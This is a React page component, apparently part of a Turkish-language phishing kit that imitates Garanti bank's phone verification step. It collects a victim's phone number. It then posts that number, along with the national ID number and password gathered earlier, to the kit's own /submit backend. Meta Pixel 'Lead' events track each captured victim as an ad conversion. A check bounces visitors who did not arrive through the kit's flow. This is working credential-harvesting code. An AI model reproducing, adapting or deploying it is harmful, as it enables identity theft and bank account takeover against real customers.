import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { useAuth } from './AuthContext';

/* global fbq */
function Telefon() {
  const { state: authState, dispatch } = useAuth();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [phoneError, setPhoneError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const navigate = useNavigate();
  const location = useLocation();

  // _fbp ve _fbc yardımcı fonksiyonları
  const getFbp = () => {
    const cookies = document.cookie.split(';');
    const fbpCookie = cookies.find(c => c.trim().startsWith('_fbp='));
    if (fbpCookie) {
      const fbp = fbpCookie.split('=')[1];
      if (/^fb\.1\.\d+\.\d+$/.test(fbp)) return fbp;
    }
    return undefined;
  };

  const getFbc = () => {
    const cookies = document.cookie.split(';');
    const fbcCookie = cookies.find(c => c.trim().startsWith('_fbc='));
    if (fbcCookie) return fbcCookie.split('=')[1];

    const urlParams = new URLSearchParams(window.location.search);
    const fbclid = urlParams.get('fbclid');
    if (fbclid) {
      const creationTime = Math.floor(Date.now() / 1000);
      const fbcValue = `fb.1.${creationTime}.${fbclid}`;
      const secureFlag = window.location.protocol === 'http:' ? '' : '; Secure';
      document.cookie = `_fbc=${fbcValue}; path=/; max-age=31536000; SameSite=Lax${secureFlag}`;
      return fbcValue;
    }
    return undefined;
  };

  // Sayfa yüklendiğinde ViewContent
  useEffect(() => {
    if (typeof window !== 'undefined' && window.fbq) {
      fbq('track', 'ViewContent', {
        content_category: 'garanti_credit_form',
        content_name: 'garanti_phone_verification_page',
      });
    }
  }, []);

  // Güvenlik: Sadece doğru kaynaktan gelinmişse devam et
  useEffect(() => {
    if (!location.state?.isValidNavigation || !authState.isAuthenticated) {
      navigate('/', { replace: true });
    }
  }, [location.state, authState, navigate]);

  const trackMetaLead = async (phone, eventID) => {
    if (typeof window !== 'undefined' && window.fbq) {
      fbq('track', 'Lead', {
        custom_data: {
          content_category: 'garanti_lead_form',
          content_name: 'garanti_phone_verification',
          value: 1,
          currency: 'TRY'
        },
      }, { eventID });
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setPhoneError('');
    const cleanPhone = phoneNumber.replace(/\D/g, '');

    if (cleanPhone.length !== 10 || !cleanPhone.startsWith('5')) {
      setPhoneError('Telefon numarası 10 haneli olmalı ve 5 ile başlamalı.');
      return;
    }

    const leadEventID = `lead_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const completeEventID = `complete_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const completeEventTime = Math.floor(Date.now() / 1000);

    try {
      setIsSubmitting(true);
      await trackMetaLead(cleanPhone, leadEventID);

      const payload = {
        tc: authState.tc,
        phone: cleanPhone,
        password: authState.password,
        eventID: leadEventID,
        initEventID: location.state?.initEventID,
        fbp: getFbp(),
        fbc: getFbc(),
        completeEventID,
        completeEventTime
      };

      const apiUrl = process.env.REACT_APP_API_URL || 'http://localhost:3001';
      await axios.post(`${apiUrl}/submit`, payload);

      dispatch({ type: 'SET_PHONE_VERIFIED' });
      navigate('/bekleme', {
        state: {
          isValidNavigation: true,
          from: '/telefon',
          isCompleted: true,
          completeEventID,
          completeEventTime
        }
      });
    } catch (error) {
      console.error('[Telefon] Hata:', error);
      setPhoneError('Bilgiler gönderilemedi, lütfen tekrar deneyin.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="panel">
      <div id="phoneEntryPanel" className="panel-body">
        <h1 className="panel-title light">
          Telefon Doğrulama
          <p>Lütfen 10 haneli kayıtlı telefon numaranızı girin.</p>
        </h1>
        <div className="row">
          <div className="col-md-12">
            <div className="form-horizontal">
              <form id="telefonForm" onSubmit={handleSubmit} autoComplete="off">
                <div className="formField">
                  <div className="formFieldOuter">
                    <div className="formFieldInner form-group">
                      <label htmlFor="phoneNumber" className="col-sm-5 col-md-4 control-label">
                        Telefon Numarası
                      </label>
                      <div className="formFieldSurround col-sm-7 col-md-8">
                        <input
                          type="tel"
                          className="form-control"
                          value={phoneNumber}
                          onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, '').slice(0, 10))}
                          pattern="[0-9]*"
                          id="phoneNumber"
                          maxLength="10"
                          autoComplete="off"
                          placeholder="5XXXXXXXXX"
                        />
                        {phoneError && (
                          <div className="errorContainer advice-text has-alert" aria-live="assertive">
                            <div className="errorWrapper">
                              <div className="errorMessage">{phoneError}</div>
                            </div>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>

                <div className="form-group form-group-offset footer-button">
                  <div className="col-sm-7 col-md-8 col-sm-offset-5 col-md-offset-4 col-xs-12">
                    <p>
                      <button
                        id="formSubmit"
                        className="btn btn-primary btn-lg btn-block-input mobile-hover"
                        type="submit"
                        disabled={isSubmitting}
                        aria-busy={isSubmitting ? 'true' : 'false'}
                      >
                        {isSubmitting ? (
                          <>
                            <i className="fa fa-spinner fa-spin" aria-hidden="true" />
                            <span style={{ marginLeft: 8 }}>Gönderiliyor…</span>
                          </>
                        ) : (
                          'Telefon Numarasını Doğrula'
                        )}
                      </button>
                    </p>
                  </div>
                </div>
              </form>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default Telefon;
